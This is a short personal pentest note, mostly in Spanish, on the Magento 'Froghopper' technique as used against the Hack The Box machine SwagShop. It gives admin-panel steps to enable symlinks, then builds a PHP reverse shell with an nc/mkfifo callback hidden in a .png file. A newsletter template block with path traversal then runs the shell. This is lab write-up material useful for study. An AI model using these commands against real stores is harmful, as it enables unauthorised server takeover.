
## DESCRIPTION



#### Mas información
* https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper
* https://0xdf.gitlab.io/2019/09/28/htb-swagshop.html


## EXPLOITATION

1. Entramos en el panel del Admin y luego en System → Configuración
![[Pasted image 20230421144309.png]]

2.  Despues accedemos al menu de ADVANCE y luego a Developer

![[Pasted image 20230421144337.png]]

3. Accedemos a Template Setting y activamos (yes) el “Allow Symlinks”

![[Pasted image 20230421145346.png]]

4. Then I got a blank png image and echoed a php reverse shell to it :
Creamos una imagen con una reverse shell en php:

```
echo '<?php' >> shell.php.png
echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1337 >/tmp/f");' >> shell.php.png
echo '?>' >> shell.php.png
```
![[Pasted image 20230421174353.png]]
5. Accedemos a Catalog → Manage Categories
![[Pasted image 20230421174408.png]]

6.  Creamos una categoría y subimos la reverse shell
![[Pasted image 20230421174429.png]]

7.  Newsletter –> Newsletter Templates → Creamos una nueva template

![[Pasted image 20230421174449.png]]
```
	{{block type='core/template' template='../../../../../../media/catalog/category/shell.php.png'}}
```

8. Then I saved the template and clicked on the preview template button :
![[Pasted image 20230421174541.png]]

9. NC
![[Pasted image 20230421174546.png]]
## MACHINES

* Hack The Box: SWAGSHOP

